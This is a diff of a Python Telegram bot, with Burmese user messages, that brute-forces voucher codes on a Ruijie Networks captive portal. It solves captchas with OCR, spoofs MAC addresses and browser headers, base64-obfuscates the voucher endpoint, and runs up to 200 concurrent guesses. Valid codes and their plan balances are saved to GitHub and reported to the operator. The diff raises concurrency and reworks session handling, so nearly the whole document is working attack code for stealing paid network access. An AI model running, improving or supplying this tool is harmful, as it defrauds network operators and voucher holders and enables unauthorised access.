@@ -1,12 +1,22 @@
 """
-Voucher Bot — Pre-Warm Session Pool + Fixed URLs
-Production-stable single-file. Copy-paste ready.
+Voucher Bot — Optimized (single-file)
+
+Feature set:
+  • Auto-cleanup stale webhook at startup (prevents 409 Conflict)
+  • Admin-only command guard (except none)
+  • SSRF guard + session-URL structure check
+  • Plan filters (e.g. 30min, 2h, 1d, 1mo, unlimit)
+  • Multi-length spec (6 | 6,7,8 | 6-8 | 6,8-10,12) + target count
+  • GitHub persistence (result.json) + local state (state.json)
+  • Race-safe Telegram notifications (per-chat asyncio.Lock)
+  • Captcha OCR: raw-first, thresholded-fallback
+  • Bounded exhaustive enumeration for mode 1 (<= 5 chars)
+  • Safe 4096-char message chunking
+  • No hardcoded secrets — env only
 """
 
 import asyncio
 import base64
-import gc
-import ipaddress
 import json
 import logging
 import os
@@ -15,6 +25,7 @@ import re
 import string
 import time
 import uuid
+import ipaddress
 from urllib.parse import urlparse, parse_qs
 
 import aiohttp
@@ -32,7 +43,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger("voucher-bot")
 
-# ── Environment ────────────────────────────────────────────────────────────
+# ── Environment (no hardcoded secrets) ─────────────────────────────────────
 def _required(name: str) -> str:
     v = os.environ.get(name)
     if not v:
@@ -47,11 +58,8 @@ REPO_NAME    = os.environ.get("REPO_NAME", "")
 GITHUB_ON    = bool(GITHUB_TOKEN and REPO_OWNER and REPO_NAME)
 
 # ── Constants ──────────────────────────────────────────────────────────────
-# Portal က rate-limit ပေးတာမို့ concurrency ကို 80-120 အတွင်းထား (ပိုမြင့်ရင် 429 တက်မယ်)
-CONCURRENCY  = 100
-BATCH_SIZE   = 200
-POOL_MAX     = 40          # Pre-warm session pool size
-POOL_REFILL  = 10          # Refill when below this
+CONCURRENCY  = 200
+BATCH_SIZE   = 500
 STATE_FILE   = "state.json"
 RESULT_FILE  = "result.json"
 EXHAUSTIVE_MODE1_MAX_LEN = 5
@@ -61,15 +69,6 @@ START_TS     = time.monotonic()
 POST_URL = base64.b64decode(
     b"aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM="
 ).decode()
-
-BASE_HOST = "portal-as.ruijienetworks.com"
-BASE_URL  = f"https://{BASE_HOST}"
-
-CAPTCHA_IMAGE_URL   = f"{BASE_URL}/api/auth/captcha/image"
-CAPTCHA_VERIFY_URL  = f"{BASE_URL}/api/auth/captcha/verify"
-BALANCE_URL_TPL     = f"{BASE_URL}/api/macc2/balance/getBalance/{{token}}"
-INDEX_REFERER       = f"{BASE_URL}/download/static/maccauth/src/index.html"
-BALANCE_REFERER_TPL = f"{BASE_URL}/download/static/maccauth/src/balance.html?sessionId={{sid}}"
 
 MODE_INFO = {
     "1": ("ဂဏန်းသီးသန့် (0-9)",        string.digits,                          10),
@@ -91,6 +90,7 @@ limited_texts    = {}
 notify_setting   = {}
 last_scan_params = {}
 pending_brute    = {}
+
 success_msg_ids  = {}
 limited_msg_ids  = {}
 
@@ -99,12 +99,6 @@ _success_queue = asyncio.Queue()
 _voucher_sem   = None
 session: aiohttp.ClientSession | None = None
 _connector: aiohttp.TCPConnector | None = None
-_ocr           = None
-
-# Per-chat pre-authenticated session pool
-# chat_id -> asyncio.Queue[(session_id, auth_code)]
-session_pools: dict[int, asyncio.Queue] = {}
-pool_fillers:  dict[int, asyncio.Task]  = {}
 
 
 def _notify_lock(cid: int) -> asyncio.Lock:
@@ -153,14 +147,14 @@ async def _render_chunked(chat_id: int, text: str, tracker: dict):
                 try:
                     sent = await bot.send_message(chat_id, chunk, parse_mode="Markdown")
                     mids[i] = sent.message_id
-                except Exception:
-                    pass
+                except Exception as ee:
+                    logger.debug("send chunk error: %s", ee)
         else:
             try:
                 sent = await bot.send_message(chat_id, chunk, parse_mode="Markdown")
                 mids.append(sent.message_id)
-            except Exception:
-                pass
+            except Exception as ee:
+                logger.debug("send chunk error: %s", ee)
     while len(mids) > len(chunks):
         mid = mids.pop()
         try:
@@ -234,18 +228,22 @@ def _parse_seconds(val) -> str:
 
 # ── Code generators ────────────────────────────────────────────────────────
 def iter_codes(mode, length):
-    mode = str(mode); length = int(length)
+    mode = str(mode)
+    length = int(length)
     if mode not in MODE_INFO:
         raise ValueError(f"Mode 1-5 အတွင်းသာ ဖြစ်ရမည် (got {mode})")
     if not (1 <= length <= 20):
         raise ValueError("Length 1-20 အတွင်းသာ ဖြစ်ရမည်")
+
     _, charset, _ = MODE_INFO[mode]
+
     if mode == "1" and length <= EXHAUSTIVE_MODE1_MAX_LEN:
         order = list(range(10 ** length))
         random.shuffle(order)
         for i in order:
             yield str(i).zfill(length)
         return
+
     while True:
         yield "".join(random.choice(charset) for _ in range(length))
 
@@ -273,7 +271,7 @@ def parse_length_spec(spec: str) -> list[int]:
     return out
 
 
-def format_progress(checked, speed, found, target, current_length, lengths, pool_size=0):
+def format_progress(checked, speed, found, target, current_length, lengths):
     lines = ["📋 Status: Running"]
     if current_length is not None and lengths and len(lengths) > 1:
         idx = lengths.index(current_length) + 1 if current_length in lengths else "?"
@@ -285,8 +283,6 @@ def format_progress(checked, speed, found, target, current_length, lengths, pool
     lines.append(f"💎 Found: {found}")
     if target:
         lines.append(f"🎯 Target: {found}/{target}")
-    if pool_size:
-        lines.append(f"🔋 Pool: {pool_size}")
     return "\n".join(lines)
 
 
@@ -323,6 +319,8 @@ def is_valid_session_url(url: str) -> bool:
 
 
 # ── Captcha ────────────────────────────────────────────────────────────────
+_ocr = None
+
 def _get_ocr():
     global _ocr
     if _ocr is None:
@@ -357,7 +355,7 @@ async def Captcha_Text(image_bytes):
     return await asyncio.to_thread(_ocr_sync, image_bytes)
 
 
-# ── Network helpers (URLs FIXED) ───────────────────────────────────────────
+# ── Network helpers ────────────────────────────────────────────────────────
 def _random_mac() -> str:
     first = random.choice([0x02, 0x06, 0x0A, 0x0E])
     return ":".join(f"{b:02x}" for b in [first] + [random.randint(0, 255) for _ in range(5)])
@@ -387,30 +385,33 @@ async def get_session_id(sess, session_url, previous=None):
 
 async def Captcha_Image(sess, session_id):
     headers = {
-        "authority": BASE_HOST,
+        "authority": "portal-as.ruijienetworks.com",
         "accept": "image/*,*/*;q=0.8",
-        "referer": INDEX_REFERER,
+        "referer": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html",
         "user-agent": ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                        "(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"),
     }
     params = {"sessionId": session_id, "_t": str(time.time())}
-    async with sess.get(CAPTCHA_IMAGE_URL, params=params, headers=headers) as req:
+    async with sess.get(
+        "https://portal-as.ruijienetworks.com/api/auth/captcha/image",
+        params=params, headers=headers,
+    ) as req:
         return await req.read()
 
 
 async def Varify_Captcha(sess, session_id, text):
     headers = {
-        "authority": BASE_HOST,
+        "authority": "portal-as.ruijienetworks.com",
         "content-type": "application/json",
-        "origin": BASE_URL,
-        "referer": INDEX_REFERER,
+        "origin": "https://portal-as.ruijienetworks.com",
+        "referer": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html",
         "user-agent": ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                        "(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"),
     }
     try:
         async with sess.post(
-            CAPTCHA_VERIFY_URL, headers=headers,
-            json={"sessionId": session_id, "authCode": text},
+            "https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
+            headers=headers, json={"sessionId": session_id, "authCode": text},
         ) as req:
             try:
                 data = await req.json(content_type=None)
@@ -425,11 +426,12 @@ async def Varify_Captcha(sess, session_id, text):
 async def get_balance(session_or_token: str) -> str:
     if not session_or_token:
         return "N/A"
-    url = BALANCE_URL_TPL.format(token=session_or_token)
+    url = f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_or_token}"
     headers = {
-        "authority": BASE_HOST,
+        "authority": "portal-as.ruijienetworks.com",
         "accept": "application/json, text/javascript, */*; q=0.01",
-        "referer": BALANCE_REFERER_TPL.format(sid=session_or_token),
+        "referer": (f"https://portal-as.ruijienetworks.com/download/static/"
+                    f"maccauth/src/balance.html?sessionId={session_or_token}"),
         "x-requested-with": "XMLHttpRequest",
         "user-agent": ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                        "(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"),
@@ -464,70 +466,6 @@ async def get_balance(session_or_token: str) -> str:
         return "N/A"
 
 
-# ── Pre-warmed Session Pool ────────────────────────────────────────────────
-async def _make_authed_session(session_url):
-    """Create one captcha-verified (session_id, auth_code) pair."""
-    for _ in range(3):
-        try:
-            sid = await get_session_id(session, session_url)
-            if not sid:
-                continue
-            for _ in range(3):
-                img = await Captcha_Image(session, sid)
-                txt = await Captcha_Text(img)
-                if not txt:
-                    continue
-                if await Varify_Captcha(session, sid, txt):
-                    return sid, txt
-        except Exception as e:
-            logger.debug("_make_authed_session: %s", e)
-    return None, None
-
-
-async def session_pool_filler(chat_id: int, session_url: str):
-    """Background task: keep the pool topped up with pre-authed sessions."""
-    pool = session_pools[chat_id]
-    while True:
-        ct = scan_tasks.get(chat_id)
-        if not ct or ct.get("stop"):
-            logger.info("pool filler for %s stopping (scan ended)", chat_id)
-            return
-        try:
-            if pool.qsize() >= POOL_MAX:
-                await asyncio.sleep(1.5)
-                continue
-            sid, auth = await _make_authed_session(session_url)
-            if sid and auth:
-                try:
-                    pool.put_nowait((sid, auth))
-                except asyncio.QueueFull:
-                    pass
-                logger.debug("🔋 pool[%s] += 1 (size=%d)", chat_id, pool.qsize())
-            else:
-                await asyncio.sleep(0.3)
-        except asyncio.CancelledError:
-            raise
-        except Exception as e:
-            logger.debug("pool filler err: %s", e)
-            await asyncio.sleep(1)
-        finally:
-            gc.collect()
-
-
-def _start_pool(chat_id: int, session_url: str):
-    _stop_pool(chat_id)
-    session_pools[chat_id] = asyncio.Queue(maxsize=POOL_MAX + 5)
-    task = asyncio.create_task(session_pool_filler(chat_id, session_url))
-    pool_fillers[chat_id] = task
-
-
-def _stop_pool(chat_id: int):
-    task = pool_fillers.pop(chat_id, None)
-    if task and not task.done():
-        task.cancel()
-    session_pools.pop(chat_id, None)
-
-
 # ── Notification rendering ─────────────────────────────────────────────────
 async def _notify_success(chat_id: int):
     if not notify_setting.get(chat_id, False):
@@ -552,7 +490,7 @@ async def _notify_limited(chat_id: int):
         await _render_chunked(chat_id, text, limited_msg_ids)
 
 
-# ── Core voucher check (POOL-AWARE) ────────────────────────────────────────
+# ── Core voucher check ─────────────────────────────────────────────────────
 async def perform_check(session_url, code, chat_id, scan_id=None,
                         recheck=False, plan_filters=None):
     if not recheck:
@@ -560,62 +498,75 @@ async def perform_check(session_url, code, chat_id, scan_id=None,
         if not ct or ct.get("scan_id") != scan_id:
             return None
 
-    # Grab a pre-authed session from the pool if available
-    sid = auth = None
-    pool = session_pools.get(chat_id)
-    if pool is not None:
-        try:
-            sid, auth = pool.get_nowait()
-        except asyncio.QueueEmpty:
-            sid, auth = None, None
-
-    # Fallback: make one synchronously (blocking)
-    if not sid:
-        sid, auth = await _make_authed_session(session_url)
-    if not sid:
-        return None
-
-    # ── POST voucher ──────────────────────────────────────────────────────
     response = None
-    for attempt in range(2):
-        try:
-            if not recheck:
-                ct = scan_tasks.get(chat_id)
-                if not ct or ct.get("scan_id") != scan_id or ct.get("stop"):
-                    return None
+    session_id = None
 
-            data = {"accessCode": code, "sessionId": sid,
-                    "apiVersion": 1, "authCode": auth}
-            headers = {
-                "authority": BASE_HOST,
-                "accept": "*/*",
-                "content-type": "application/json",
-                "origin": BASE_URL,
-                "referer": f"{INDEX_REFERER}?sessionId={sid}",
-                "user-agent": ("Mozilla/5.0 (Linux; Android 12; K) "
-                               "AppleWebKit/537.36 (KHTML, like Gecko) "
-                               "Chrome/139.0.0.0 Mobile Safari/537.36"),
-            }
-            async with session.post(POST_URL, json=data, headers=headers) as req:
-                if req.status == 429:
-                    await asyncio.sleep(2)
+    for attempt in range(3):
+        try:
+            async with aiohttp.ClientSession(
+                connector=_connector, connector_owner=False,
+                cookie_jar=aiohttp.CookieJar(),
+                timeout=aiohttp.ClientTimeout(total=30),
+            ) as ts:
+                session_id = await get_session_id(ts, session_url)
+                if not session_id:
                     continue
-                response = await req.text()
-            break
+
+                auth_code = None
+                for _ in range(8):
+                    try:
+                        img = await Captcha_Image(ts, session_id)
+                        txt = await Captcha_Text(img)
+                        if not txt:
+                            continue
+                        if await Varify_Captcha(ts, session_id, txt):
+                            auth_code = txt
+                            break
+                    except Exception as e:
+                        logger.debug("captcha loop: %s", e)
+                        continue
+                if not auth_code:
+                    continue
+
+                if not recheck:
+                    ct = scan_tasks.get(chat_id)
+                    if not ct or ct.get("scan_id") != scan_id or ct.get("stop"):
+                        return None
+
+                data = {"accessCode": code, "sessionId": session_id,
+                        "apiVersion": 1, "authCode": auth_code}
+                headers = {
+                    "authority": "portal-as.ruijienetworks.com",
+                    "accept": "*/*",
+                    "content-type": "application/json",
+                    "origin": "https://portal-as.ruijienetworks.com",
+                    "referer": (f"https://portal-as.ruijienetworks.com/download/"
+                                f"static/maccauth/src/index.html?sessionId={session_id}"),
+                    "user-agent": ("Mozilla/5.0 (Linux; Android 12; K) "
+                                   "AppleWebKit/537.36 (KHTML, like Gecko) "
+                                   "Chrome/139.0.0.0 Mobile Safari/537.36"),
+                }
+                async with ts.post(POST_URL, json=data, headers=headers) as req:
+                    response = await req.text()
+                logger.debug("voucher code=%s attempt=%d", code, attempt + 1)
         except Exception as e:
             logger.debug("perform_check attempt %d: %s", attempt + 1, e)
             response = None
-            await asyncio.sleep(0.5)
+            continue
+
+        if response and "request limited" in response:
+            await asyncio.sleep(2)
+            continue
+        break
 
     if not response:
         return None
 
-    # ── Interpret ─────────────────────────────────────────────────────────
     if "logonUrl" in response:
         if recheck:
             return code
 
-        token_for_balance = sid
+        token_for_balance = session_id
         try:
             rj = json.loads(response)
             logon = (rj.get("result") or {}).get("logonUrl", "") if isinstance(rj, dict) else ""
@@ -631,16 +582,15 @@ async def perform_check(session_url, code, chat_id, scan_id=None,
 
         if plan_filters:
             code_mins = plan_to_minutes(plan_str)
-            if code_mins > 0:  # only filter when we know the plan
-                if not any(code_mins >= plan_to_minutes(f) for f in plan_filters):
-                    return None
+            if not any(code_mins >= plan_to_minutes(f) for f in plan_filters):
+                return None
 
         success_texts.setdefault(chat_id, []).append(
-            {"code": code, "session_id": sid, "plan": plan_str}
+            {"code": code, "session_id": session_id, "plan": plan_str}
         )
         await _success_queue.put({
             "chat_id": chat_id, "code": code,
-            "session_id": sid, "plan": plan_str,
+            "session_id": session_id, "plan": plan_str,
         })
         await _notify_success(chat_id)
         return code
@@ -648,7 +598,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None,
     if "STA" in response:
         limited_texts.setdefault(chat_id, []).append(code)
         await _notify_limited(chat_id)
-
     return None
 
 
@@ -658,8 +607,6 @@ async def run_bruteforce(mode, lengths, chat_id, session_url, scan_id,
     checked = 0
     found = 0
     scan_start = time.monotonic()
-
-    _start_pool(chat_id, session_url)  # kick off background pool warmer
 
     try:
         for li, length in enumerate(lengths):
@@ -722,9 +669,7 @@ async def run_bruteforce(mode, lengths, chat_id, session_url, scan_id,
                 checked += len(batch)
                 elapsed = time.monotonic() - scan_start
                 speed = (checked / elapsed * 60) if elapsed > 0 else 0
-                pool = session_pools.get(chat_id)
-                text = format_progress(checked, speed, found, target, length, lengths,
-                                       pool_size=pool.qsize() if pool else 0)
+                text = format_progress(checked, speed, found, target, length, lengths)
                 try:
                     await bot.edit_message_text(
                         chat_id=chat_id,
@@ -739,8 +684,6 @@ async def run_bruteforce(mode, lengths, chat_id, session_url, scan_id,
                         except Exception:
                             pass
 
-                gc.collect()
-
         try:
             await bot.edit_message_text(
                 chat_id=chat_id, message_id=progress_msg.message_id,
@@ -754,9 +697,7 @@ async def run_bruteforce(mode, lengths, chat_id, session_url, scan_id,
     except asyncio.CancelledError:
         raise
     finally:
-        _stop_pool(chat_id)
         scan_tasks.pop(chat_id, None)
-        gc.collect()
 
 
 # ── GitHub persistence ─────────────────────────────────────────────────────
@@ -842,12 +783,12 @@ async def load_saved_results():
             for e in entries:
                 if isinstance(e, dict):
                     code = e.get("code", "")
-                    sid_ = e.get("session_id", "")
+                    sid = e.get("session_id", "")
                     plan = e.get("plan", "N/A")
                 else:
-                    code, sid_, plan = str(e), "", "N/A"
+                    code, sid, plan = str(e), "", "N/A"
                 if not any(x["code"] == code for x in success_texts[cid]):
-                    success_texts[cid].append({"code": code, "session_id": sid_, "plan": plan})
+                    success_texts[cid].append({"code": code, "session_id": sid, "plan": plan})
         total = sum(len(v) for v in success_texts.values())
         logger.info("Loaded %d saved code(s) from GitHub", total)
     except Exception as e:
@@ -910,24 +851,33 @@ async def web_server():
 # ── Usage text ─────────────────────────────────────────────────────────────
 USAGE_TEXT = (
     "📖 **Voucher Bot အသုံးပြုနည်း**\n\n"
-    "**၁။ Setup:** `/setup <url>`\n\n"
-    "**၂။ ရှာဖွေခြင်း:** `/brute <mode> <lengths> [target] [plan…]`\n\n"
+    "**၁။ Setup:**\n"
+    "`/setup <url>`\n\n"
+    "**၂။ ရှာဖွေခြင်း:**\n"
+    "`/brute <mode> <lengths> [target] [plan…]`\n\n"
     "*Mode:*\n"
     "  1 = ဂဏန်းသီးသန့် (0-9)\n"
     "  2 = အင်္ဂလိပ်အသေး (a-z)\n"
     "  3 = အင်္ဂလိပ်အကြီး (A-Z)\n"
     "  4 = အကြီး+အသေး (a-zA-Z)\n"
     "  5 = အသေး+ဂဏန်း (a-z, 0-9)\n\n"
+    "*Lengths:*\n"
+    "  `6`         → length 6 တစ်ခုတည်း\n"
+    "  `6,7,8`     → length 6, 7, 8 သုံးခု ဆက်တိုက်\n"
+    "  `6-8`       → range 6-8\n"
+    "  `6,8-10,12` → mixed\n\n"
     "*ဥပမာ:*\n"
-    "  `/brute 1 5 1` – digits ၅လုံး, ၁ခုရရင် ရပ်\n"
-    "  `/brute 5 4 3` – alnum ၄လုံး, ၃ခုရရင် ရပ်\n\n"
-    "**၃။** `/status` – အခြေအနေ\n"
-    "**၄။** `/stop` – ရပ်တန့်\n"
-    "**၅။** `/resume` – ဆက်ရှာ\n"
-    "**၆။** `/saved` – ရလဒ်ကြည့်\n"
-    "**၇။** `/delete_saved` – ရလဒ်ဖျက်\n"
-    "**၈။** `/recheck` – ပြန်စစ်\n"
-    "**၉။** `/notify` – Notification ON/OFF"
+    "  `/brute 1 6 5`          → ဂဏန်း ၆လုံး ၅ခု\n"
+    "  `/brute 1 4-8 10`       → ဂဏန်း ၄-၈လုံး ၁၀ခု\n"
+    "  `/brute 5 4,6-8 1d`     → alnum ၄,၆,၇,၈လုံး ၁ရက်\n"
+    "  `/brute 2 6 1d 1mo`     → lowercase ၆လုံး ၁ရက် / ၁လ\n\n"
+    "**၃။** `/status`        – အခြေအနေ\n"
+    "**၄။** `/stop`          – ရပ်တန့်\n"
+    "**၅။** `/resume`        – ဆက်ရှာ\n"
+    "**၆။** `/saved`         – ရလဒ်ကြည့်\n"
+    "**၇။** `/delete_saved`  – ရလဒ်ဖျက်\n"
+    "**၈။** `/recheck`       – Success codes ပြန်စစ်\n"
+    "**၉။** `/notify`        – Notification ON/OFF"
 )
 
 
@@ -935,13 +885,15 @@ USAGE_TEXT = (
 @bot.message_handler(commands=["start"])
 async def cmd_start(message):
     if not is_admin(message.chat.id):
+        await bot.reply_to(message, "❌ No Permission")
         return
-    await bot.reply_to(message, "Bot အသင့်။ /help ကြည့်ပါ။")
+    await bot.reply_to(message, "Bot အသင့်ဖြစ်ပါပြီ။ /help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။")
 
 
 @bot.message_handler(commands=["help"])
 async def cmd_help(message):
     if not is_admin(message.chat.id):
+        await bot.reply_to(message, "❌ No Permission")
         return
     await bot.reply_to(message, USAGE_TEXT, parse_mode="Markdown")
 
@@ -949,14 +901,16 @@ async def cmd_help(message):
 @bot.message_handler(commands=["setup"])
 async def cmd_setup(message):
     if not is_admin(message.chat.id):
+        await bot.reply_to(message, "❌ No Permission")
         return
     args = message.text.split(maxsplit=1)
     if len(args) < 2:
         await bot.reply_to(message, "အသုံးပြုနည်း: /setup <session_url>")
         return
     url = args[1].strip()
+    await bot.reply_to(message, "⏳ Session URL စစ်ဆေးနေပါသည်...")
     if not is_valid_session_url(url):
-        await bot.reply_to(message, "❌ Session URL မမှန် (gw_id/gw_address/gw_port/mac/ip လိုအပ်)")
+        await bot.reply_to(message, "❌ Session URL မမှန်ပါ (gw_id/gw_address/gw_port/mac/ip လိုအပ်သည်)။")
         return
 
     cid = message.chat.id
@@ -964,7 +918,6 @@ async def cmd_setup(message):
     if old and old.get("task") and not old["task"].done():
         old["stop"] = True
         old["task"].cancel()
-    _stop_pool(cid)
 
     user_data.setdefault(cid, {})["session_url"] = url
     for d in (success_texts, limited_texts, last_scan_params, pending_brute,
@@ -976,16 +929,18 @@ async def cmd_setup(message):
             results, sha = await _gh_get(RESULT_FILE)
             if str(cid) in results:
                 del results[str(cid)]
-                await _gh_put_retry(RESULT_FILE, results, sha, f"Clear {cid}")
+                await _gh_put_retry(RESULT_FILE, results, sha,
+                                    f"Clear codes for {cid} on new setup")
         except Exception as e:
             logger.warning("setup: clear GitHub failed: %s", e)
     save_state()
-    await bot.reply_to(message, "✅ Session URL သိမ်းပြီ။ /brute ဖြင့် စတင်ပါ။")
+    await bot.reply_to(message, "✅ Session URL သိမ်းဆည်းပြီးပါပြီ။ /brute ဖြင့် စတင်ပါ။")
 
 
 @bot.message_handler(commands=["brute"])
 async def cmd_brute(message):
     if not is_admin(message.chat.id):
+        await bot.reply_to(message, "❌ No Permission")
         return
     args = message.text.split()
     if len(args) < 3:
@@ -994,12 +949,13 @@ async def cmd_brute(message):
 
     mode = args[1]
     if mode not in MODE_INFO:
-        await bot.reply_to(message, "❌ Mode 1-5 အတွင်းသာ")
+        await bot.reply_to(message, "❌ Mode 1-5 အတွင်းသာ ဖြစ်ရမည်။")
         return
+
     try:
         lengths = parse_length_spec(args[2])
     except ValueError as e:
-        await bot.reply_to(message, f"❌ Length မမှန်: {e}")
+        await bot.reply_to(message, f"❌ Length မမှန်: {e}\nဥပမာ: 6 | 6,7,8 | 6-8 | 6,8-10,12")
         return
 
     target = None
@@ -1010,22 +966,23 @@ async def cmd_brute(message):
             target = int(args[idx])
             idx += 1
         except ValueError:
-            await bot.reply_to(message, "❌ Target ဂဏန်း ဖြစ်ရမည်")
+            await bot.reply_to(message, "❌ Target သည် ဂဏန်း ဖြစ်ရမည်။\nPlan ဥပမာ: 30min, 2h, 1d, 1mo, unlimit")
             return
+
     for arg in args[idx:]:
         if not PLAN_RE.match(arg):
-            await bot.reply_to(message, f"❌ Plan '{arg}' မမှန်")
+            await bot.reply_to(message, f"❌ '{arg}' သည် plan ပုံစံမမှန်။\nဥပမာ: 30min, 2h, 1d, 1mo, unlimit")
             return
         plan_filters.append(arg)
 
     cid = message.chat.id
     if cid not in user_data or "session_url" not in user_data[cid]:
-        await bot.reply_to(message, "❌ /setup ဖြင့် URL ထည့်ပါ")
+        await bot.reply_to(message, "❌ /setup ဖြင့် Session URL ထည့်ပါ။")
         return
 
     running = scan_tasks.get(cid)
     if running and not running["task"].done():
-        await bot.reply_to(message, "⚠️ Scan run နေဆဲ။ /stop ဦး")
+        await bot.reply_to(message, "⚠️ Scan တစ်ခု run နေဆဲ။ /stop ဦးသုံးပါ။")
         return
 
     if cid in last_scan_params:
@@ -1045,7 +1002,7 @@ async def cmd_brute(message):
             message,
             f"ယခင် scan ရပ်ထားသည် (mode: {prev.get('mode','?')}, "
             f"lengths: {prev_len}, target: {prev.get('target')}, "
-            f"plan: {prev_plans}). ပြန်စမလား၊ အသစ်စမလား?",
+            f"plan: {prev_plans}).\nပြန်စမလား၊ အသစ်စမလား?",
             reply_markup=markup,
         )
         return
@@ -1077,6 +1034,7 @@ async def _start_brute_scan(chat_id, mode, lengths, target, plan_filters):
 @bot.message_handler(commands=["stop"])
 async def cmd_stop(message):
     if not is_admin(message.chat.id):
+        await bot.reply_to(message, "❌ No Permission")
         return
     cid = message.chat.id
     data = scan_tasks.get(cid)
@@ -1084,29 +1042,31 @@ async def cmd_stop(message):
         data["stop"] = True
         data["task"].cancel()
         scan_tasks.pop(cid, None)
-        _stop_pool(cid)
         save_state()
-        await bot.reply_to(message, "⏹️ ရပ်ပြီ။ /resume ဖြင့် ဆက်နိုင်သည်။")
+        await bot.reply_to(message, "⏹️ ရပ်ပြီးပါပြီ။ /resume ဖြင့် ဆက်နိုင်သည်။")
     else:
-        await bot.reply_to(message, "⚠️ ရပ်ရန် scan မရှိပါ")
+        await bot.reply_to(message, "⚠️ ရပ်ရန် scan မရှိပါ။")
 
 
 @bot.message_handler(commands=["resume"])
 async def cmd_resume(message):
     if not is_admin(message.chat.id):
+        await bot.reply_to(message, "❌ No Permission")
         return
     cid = message.chat.id
     if cid not in last_scan_params:
-        await bot.reply_to(message, "⚠️ ယခင်ရပ်ထားသော scan မရှိပါ")
+        await bot.reply_to(message, "⚠️ ယခင်ရပ်ထားသော scan မရှိပါ။")
         return
     params = last_scan_params.pop(cid)
     save_state()
-    lengths = params.get("lengths") or ([params["length"]] if "length" in params else [6])
-    await _start_brute_scan(
-        cid, params["mode"], lengths,
-        params.get("target"), params.get("plan_filters", []),
+    lengths = params.get("lengths") or (
+        [params["length"]] if "length" in params else [6]
     )
-    await bot.reply_to(message, "▶️ ပြန်စပါပြီ")
+    await _start_brute_scan(
+        cid, params["mode"], lengths, params.get("target"),
+        params.get("plan_filters", []),
+    )
+    await bot.reply_to(message, "▶️ ပြန်စပါပြီ။")
 
 
 @bot.callback_query_handler(func=lambda c: c.data in ("resume_scan", "new_scan"))
@@ -1116,20 +1076,22 @@ async def cb_resume(call):
     if call.data == "resume_scan":
         if cid not in last_scan_params:
             await bot.edit_message_text(
-                "Resume လုပ်ရန် scan မရှိပါ",
+                "Resume လုပ်ရန် scan မရှိပါ။",
                 chat_id=cid, message_id=call.message.message_id,
             )
             return
         params = last_scan_params.pop(cid)
         save_state()
         await bot.edit_message_text(
-            "▶️ ယခင် scan ပြန်စပါပြီ",
+            "▶️ ယခင် scan ပြန်စပါပြီ။",
             chat_id=cid, message_id=call.message.message_id,
         )
-        lengths = params.get("lengths") or ([params["length"]] if "length" in params else [6])
+        lengths = params.get("lengths") or (
+            [params["length"]] if "length" in params else [6]
+        )
         await _start_brute_scan(
-            cid, params["mode"], lengths,
-            params.get("target"), params.get("plan_filters", []),
+            cid, params["mode"], lengths, params.get("target"),
+            params.get("plan_filters", []),
         )
     else:
         params = pending_brute.pop(cid, None)
@@ -1137,29 +1099,30 @@ async def cb_resume(call):
         save_state()
         if not params:
             await bot.edit_message_text(
-                "Command ထပ်ပို့ပါ",
+                "Command ထပ်မံပေးပို့ပါ။",
                 chat_id=cid, message_id=call.message.message_id,
             )
             return
         await bot.edit_message_text(
-            "🆕 Scan အသစ် စတင်ပါပြီ",
+            "🆕 Scan အသစ် စတင်ပါပြီ။",
             chat_id=cid, message_id=call.message.message_id,
         )
         await _start_brute_scan(
-            cid, params["mode"], params["lengths"],
-            params.get("target"), params.get("plan_filters", []),
+            cid, params["mode"], params["lengths"], params.get("target"),
+            params.get("plan_filters", []),
         )
 
 
 @bot.message_handler(commands=["saved"])
 async def cmd_saved(message):
     if not is_admin(message.chat.id):
+        await bot.reply_to(message, "❌ No Permission")
         return
     cid = message.chat.id
     success = success_texts.get(cid, [])
     limited = limited_texts.get(cid, [])
     if not success and not limited:
-        await bot.reply_to(message, "⚠️ ရှာတွေ့ထားသော code မရှိသေးပါ")
+        await bot.reply_to(message, "⚠️ ရှာတွေ့ထားသော code မရှိသေးပါ။")
         return
     parts = []
     if success:
@@ -1175,29 +1138,40 @@ async def cmd_saved(message):
 @bot.message_handler(commands=["delete_saved"])
 async def cmd_delete_saved(message):
     if not is_admin(message.chat.id):
+        await bot.reply_to(message, "❌ No Permission")
         return
     cid = message.chat.id
     s_count = len(success_texts.get(cid, []))
     l_count = len(limited_texts.get(cid, []))
+
     success_texts.pop(cid, None)
     limited_texts.pop(cid, None)
     success_msg_ids.pop(cid, None)
     limited_msg_ids.pop(cid, None)
+
     if GITHUB_ON:
         try:
             results, sha = await _gh_get(RESULT_FILE)
             if str(cid) in results:
                 del results[str(cid)]
-                await _gh_put_retry(RESULT_FILE, results, sha, f"Delete {cid}")
+                await _gh_put_retry(RESULT_FILE, results, sha,
+                                    f"Delete saved for {cid}")
         except Exception as e:
-            await bot.reply_to(message, f"⚠️ Local ဖျက်ပြီ။ GitHub error: `{e}`")
+            await bot.reply_to(message,
+                f"⚠️ Local ဖျက်ပြီး။ GitHub ဖျက်ရာတွင် error: `{e}`",
+                parse_mode="Markdown")
             return
-    await bot.reply_to(message, f"🗑️ ဖျက်ပြီ။\n  • Success: {s_count}\n  • Limited: {l_count}")
+
+    await bot.reply_to(
+        message,
+        f"🗑️ ဖျက်ပြီးပါပြီ။\n  • Success: {s_count}\n  • Limited: {l_count}",
+    )
 
 
 @bot.message_handler(commands=["notify"])
 async def cmd_notify(message):
     if not is_admin(message.chat.id):
+        await bot.reply_to(message, "❌ No Permission")
         return
     cid = message.chat.id
     notify_setting[cid] = not notify_setting.get(cid, False)
@@ -1209,16 +1183,18 @@ async def cmd_notify(message):
 @bot.message_handler(commands=["recheck"])
 async def cmd_recheck(message):
     if not is_admin(message.chat.id):
+        await bot.reply_to(message, "❌ No Permission")
         return
